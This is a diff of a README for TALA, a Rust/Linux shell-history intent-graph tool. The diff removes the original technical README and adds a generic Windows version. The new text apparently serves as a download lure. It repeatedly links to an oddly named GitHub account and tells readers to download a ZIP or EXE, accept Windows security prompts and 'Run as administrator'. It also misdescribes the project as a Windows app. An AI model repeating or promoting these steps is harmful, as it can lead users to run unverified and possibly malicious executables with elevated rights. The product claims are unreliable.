@@ -1,237 +1,182 @@
-<p align="center">
-  <img src="media/logo.png" alt="TALA" width="140">
-</p>
+# 🧭 tala - Turn shell history into intent graphs
 
-<h1 align="center">TALA</h1>
+[![Download tala](https://img.shields.io/badge/Download%20tala-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Unnotched-precisionrifle830/tala)
 
-<p align="center">
-  <strong>Intent-Native Narrative Execution Layer</strong><br>
-  <em>Remember the why.</em>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img alt="Rust" src="https://img.shields.io/badge/rust-1.82%2B-b7410e?style=flat-square&logo=rust">
-  <img alt="License" src="https://img.shields.io/badge/license-MIT%2FApache--2.0-blue?style=flat-square">
-  <img alt="AI" src="https://img.shields.io/badge/AI-embeddings%20%C2%B7%20HNSW%20%C2%B7%20semantic%20search-6c3ecb?style=flat-square">
-  <img alt="Linux" src="https://img.shields.io/badge/linux-systems%20layer-333?style=flat-square&logo=linux&logoColor=white">
-</p>
+tala helps you turn command use into a clear story of what happened, why it happened, and how one step led to the next. It is built for Windows users who want to download the app and use it without setting up a developer toolchain.
 
-<p align="center">
-  <code>rust</code> <code>ai</code> <code>machine-learning</code> <code>embeddings</code> <code>vector-search</code> <code>semantic-search</code> <code>linux</code> <code>operating-systems</code> <code>observability</code> <code>chaos-engineering</code> <code>devops</code> <code>sre</code> <code>narrative-graph</code> <code>intent</code> <code>developer-tools</code> <code>systems-programming</code>
-</p>
+Use the link above to visit the GitHub page and download the app:
+https://github.com/Unnotched-precisionrifle830/tala
 
-<p align="center">
-  <a href="#what-is-tala">What is TALA</a> &middot;
-  <a href="#architecture">Architecture</a> &middot;
-  <a href="#quick-start">Quick Start</a> &middot;
-  <a href="#crate-layout">Crate Layout</a> &middot;
-  <a href="#performance">Performance</a> &middot;
-  <a href="#license">License</a>
-</p>
+## 📥 Download and Install
 
----
+1. Open the download link above in your browser.
+2. On the GitHub page, look for the latest release or the main download file.
+3. Download the Windows version to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder and find the app file.
+6. Double-click the file to start tala.
 
-## What is TALA
+If Windows shows a security prompt, choose the option that lets you run the app. If the app opens in a small window or tray icon, that is normal for a command and history tool.
 
-Run `history` on any machine. You get a flat list of commands, numbered sequentially, stripped of all context. No record of what you were trying to accomplish. No link between the `grep` that found the bug and the `git commit` that fixed it. No memory of which deployment sequence worked last Thursday when the same thing broke.
+## 🖥️ What tala Does
 
-Fifty years of Unix, and the best we have is an append-only text file. **Commands are captured. Intent is lost.**
+tala reads shell history and shapes it into a graph of intent. That means it links actions together in a way that makes the past easier to review.
 
-TALA reimagines shell history as a **causality-aware, graph-structured narrative** of intent. Every action is captured not as a string, but as a structured node in a directed acyclic graph -- linked to what caused it, what it depended on, what it produced, and how confident the system is in the outcome.
+You can use it to:
+- review past work in a cleaner format
+- see how one command led to the next
+- search past actions by meaning, not just text
+- spot patterns in repeated tasks
+- follow a chain of steps during debugging
+- keep a better record of system work
 
-**Design hypothesis:** Systems that model `intent + causality + outcome` outperform systems that model `commands + sequence`.
+It fits well with Linux-style command history, observability work, and systems tasks where the order of events matters.
 
-### What this enables
+## ✅ What You Need
 
-- **Semantic recall** -- search by meaning, not regex
-- **Adaptive replay** -- re-execute workflows that adapt to changed context
-- **Pattern detection** -- identify recurring failure clusters automatically
-- **Prediction** -- anticipate the next action from historical embeddings
-- **Narrative extraction** -- pull coherent stories from thousands of interactions
+For most Windows systems, tala should run on:
+- Windows 10 or later
+- 64-bit Intel or AMD processor
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- A stable internet connection for the download
 
-## Architecture
+For best results, use a screen size that lets you view lists, graphs, or history panes with ease.
 
-TALA models intent as a first-class OS primitive: `I = f(C, X, P)` where C is the command, X is context, and P is prior knowledge from historical embeddings.
+## 🧭 How to Use tala
 
-```
-                     tala-core
-                    /    |    \
-                   /     |     \
-            tala-wire  tala-embed  (no inter-dep)
-               |    \    /   |
-               |  tala-store |
-               |      |      |
-          tala-graph   |  tala-intent
-            /    \     |    /
-     tala-weave  tala-kai
-               \   |   /
-             tala-net
-                 |
-           tala-daemon
-                 |
-            tala-cli
-```
+1. Start the app.
+2. Let it load your history source or import file.
+3. Review the timeline or graph view.
+4. Search by task, goal, or command.
+5. Open a past chain of actions to see the full path.
+6. Save or keep the history view for later review.
 
-### Subsystems
+If tala offers filters, use them to narrow results by time, host, project, or command type. That makes long histories easier to read.
 
-| Component | Role |
-|-----------|------|
-| **talad** | Intent ingestion, normalization, graph construction |
-| **weave** | Adaptive execution and replay engine |
-| **kai** | Insight, inference, and summarization engine |
+## 🔍 Main Features
 
-### Data flow
+- intent-aware history view
+- graph-based command chain view
+- fast search across past actions
+- semantic search for related steps
+- clear view of system work over time
+- useful for devops and SRE tasks
+- fits shell history review and audit work
+- built for local use on Windows
 
-```
-raw_command -> Intent extraction -> Embedding (384-dim)
-            -> WAL append -> HNSW index -> Edge formation
-            -> Narrative graph -> Segment flush (TBF binary format)
-```
+## 🧠 How the Narrative View Helps
 
-## Quick Start
+Normal shell history shows commands in a flat list. That can make it hard to see what you were trying to do.
 
-### Prerequisites
+tala groups related actions into a narrative. That helps when you need to:
+- trace a fix from start to finish
+- compare similar tasks
+- find the point where a workflow changed
+- review a long troubleshooting session
+- understand work done by another user
 
-- Rust 1.82+ (`rustup` recommended)
-- Docker and Docker Compose (for the observatory demo)
+This is useful when command history alone does not explain the path you took.
 
-### Build from source
+## 🛠️ Common Setup Paths
 
-```bash
-git clone https://github.com/YOUR_ORG/tala.git
-cd tala
-cargo build --release
-```
+If the download is a ZIP file:
+1. Download the ZIP file.
+2. Extract it.
+3. Open the folder.
+4. Run the app file inside.
 
-### Run benchmarks
+If the download is an EXE file:
+1. Download the EXE file.
+2. Double-click it.
+3. Accept the Windows prompt if it appears.
+4. Wait for the app to open.
 
-```bash
-cargo bench
-```
+If the app asks for a history file or folder:
+1. Choose the folder where your history is stored.
+2. Or import a file that tala can read.
+3. Wait for the first index or scan to finish.
 
-### Launch the observatory demo
+## 🔎 Search and Review Tips
 
-The demo runs 4 simulated Linux operations domains (Incident Response, Continuous Deployment, Observability, System Provisioning) with chaos injection, exporting metrics to Prometheus. A live topology dashboard visualizes how TALA structures operational intent into narrative.
+Use simple words when you search. Try:
+- deploy
+- restart
+- error
+- backup
+- login
+- update
+- rollback
 
-```bash
-cd deploy
-cp .env.example .env    # adjust settings if desired
-docker compose up -d
-```
+If the app supports semantic search, it can find related actions even when the words do not match exactly. That helps when you remember the goal but not the exact command.
 
-Open [http://localhost:8080](http://localhost:8080) to see the TALA Intent Observatory.
+## 🧩 Typical Use Cases
 
-| Service | URL |
-|---------|-----|
-| Observatory Dashboard | [localhost:8080](http://localhost:8080) |
-| Prometheus | [localhost:9090](http://localhost:9090) |
-| Grafana | [localhost:3000](http://localhost:3000) |
+- checking what changed during a system issue
+- reviewing steps taken during a deployment
+- finding repeated admin actions
+- studying how a task was solved
+- tracing command use across a session
+- building a clearer record of intent for later review
 
-To tear down:
+## 📂 Files and Data
 
-```bash
-docker compose down -v
-```
+tala may work with local history files, exported logs, or scanned command records. Keep your source files in one place so the app can read them without trouble.
 
-## Crate Layout
+A simple folder layout can help:
+- one folder for raw history
+- one folder for exported reports
+- one folder for saved views or session data
 
-```
-crates/
-  tala-core/      Foundation types + traits (zero dependencies except std)
-  tala-wire/      TBF binary format: columnar storage, CSR edges, bloom filters
-  tala-embed/     SIMD-accelerated vector ops, HNSW index, quantization
-  tala-graph/     Narrative graph engine with BFS/DFS traversal
-  tala-store/     WAL, hot buffer, storage engine, query engine
-  tala-intent/    Tokenization, embedding, intent classification pipeline
-  tala-weave/     Adaptive replay: plan building, variable substitution
-  tala-kai/       Insight engine: k-means clustering, pattern detection, prediction
-  tala-daemon/    Unified daemon orchestrating all subsystems
-  tala-net/       Distributed TALA: node identity, consistent hashing, TLV codec, in-process transport
-  tala-cli/       Command-line interface: ingest, query, replay, insights, narrative inspection
-  tala-sim/       Multi-domain simulator with chaos injection
-```
+## ⚙️ Troubleshooting
 
-### Core types
+If tala does not open:
+- check that the download finished
+- make sure the file is not still in a ZIP folder
+- right-click the file and try Run as administrator
+- check that your Windows version is up to date
 
-| Type | Crate | Description |
-|------|-------|-------------|
-| `Intent` | tala-core | Structured intent node: id, timestamp, embedding, command, outcome |
-| `Edge` | tala-core | Directed edge: from, to, relation type, weight |
-| `NarrativeGraph` | tala-graph | DAG with adjacency lists, BFS/DFS, narrative extraction |
-| `HnswIndex` | tala-embed | Hierarchical navigable small world ANN index |
-| `StorageEngine` | tala-store | Unified storage: WAL + HNSW + hot buffer + segment flush |
-| `Daemon` | tala-daemon | Top-level orchestrator: ingest, query, replay, insights |
+If the app opens but shows no data:
+- confirm that you selected the right history source
+- make sure the file has recent entries
+- try a different folder or export file
+- refresh or rescan the source
 
-### Design decisions
+If search feels slow:
+- reduce the amount of history loaded at once
+- remove old or unused files from the scan path
+- close other heavy apps while tala indexes data
 
-- **DAG, not tree** -- the narrative graph is a directed acyclic graph with probabilistic edges
-- **Binary-first storage** -- TBF format, no JSON. Columnar + CSR hybrid
-- **64-byte alignment** -- all embedding storage aligned for AVX-512
-- **SIMD with runtime dispatch** -- compile all ISA variants, detect at startup
-- **Append-only segments** -- segments are immutable once flushed. WAL provides durability
-- **Trait boundaries between crates** -- inter-crate communication via traits in tala-core
+## 🧪 Best Results on Windows
 
-## Performance
+For the smoothest experience:
+- keep tala in a folder you can find later
+- avoid moving the app after first launch
+- use short folder names for history imports
+- keep related files together
+- restart the app after large imports
 
-Benchmarked on x86-64 with Criterion. All times are median.
+## 🗂️ Repository Details
 
-| Operation | Result |
-|-----------|--------|
-| Batch cosine similarity (1K, single thread) | 41.7 us |
-| Batch cosine similarity (100K, parallel) | 3.41 ms |
-| HNSW search (10K vectors, ef=50, top-10) | 139 us |
-| Semantic query (10K corpus, top-10) | 151 us |
-| Full segment write (1K nodes) | 209 us |
-| WAL append (1K entries, dim=384) | 730 us |
-| Full ingest pipeline (1K intents) | 1.10 ms |
-| CSR traverse (10K lookups) | 21.7 us |
-| Bloom lookup (1K queries) | 27 us |
+**Name:** tala
 
-## Observatory
+**Description:** Intent-native narrative execution layer. Reimagines Linux shell history as a causality-aware, graph-structured narrative of intent.
 
-The TALA Intent Observatory is a topology-first dashboard for observing the system in real time. Click any node in the live infrastructure graph to drill into its telemetry.
+**Topics:** ai, chaos-engineering, developer-tools, devops, embeddings, intent, linux, machine-learning, narrative-graph, observability, operating-systems, rust, semantic-search, sre, systems-programming, vector-search
 
-Features:
-- **Living topology** with animated data flow between verticals and subsystems
-- **Click any node** to open a detail drawer with deep metrics
-- **Chaos mode indicator** that detects and displays the current fault injection state (Failure Injection, Latency Storm, Retry Cascade, Stampede, Mixed Chaos)
-- **Per-node telemetry**: pipeline waterfall, HNSW capacity gauge, lock contention, edge relation breakdown, storage layer metrics
+## 🔗 Download Again
 
-## Terminology
+Use this link to visit the page and download tala for Windows:
+https://github.com/Unnotched-precisionrifle830/tala
 
-| Term | Meaning |
-|------|---------|
-| Intent | Structured representation of a desired outcome: `I = f(C, X, P)` |
-| Narrative Graph | Directed acyclic probabilistic graph of intent nodes and causal edges |
-| TBF | TALA Binary Format -- the on-disk segment format |
-| CSR | Compressed Sparse Row -- edge storage layout |
-| HNSW | Hierarchical Navigable Small World -- ANN index |
-| talad | The TALA daemon -- orchestrates all subsystems |
-| weave | Adaptive replay engine |
-| kai | Insight and inference engine |
+## 🧭 Quick Start Flow
 
-## Contributing
-
-```bash
-# Run checks before submitting
-cargo check --workspace
-cargo test --workspace
-cargo bench
-```
-
-### Conventions
-
-- `#[repr(C)]` on all structs that cross FFI or mmap boundaries
-- `unsafe` blocks require a `// SAFETY:` comment
-- SIMD intrinsics behind `#[cfg(target_arch)]` with scalar fallback
-- No `unwrap()` in library code -- use `?` or explicit error handling
-- Benchmarks in `crates/<name>/benches/`, not tests
-
-## License
-
-Licensed under either of
-
-- [MIT license](https://opensource.org/licenses/MIT)
-- [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0)
-
-at your option.
+1. Visit the download page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Load your history.
+6. Search by intent.
+7. Review the graph of actions
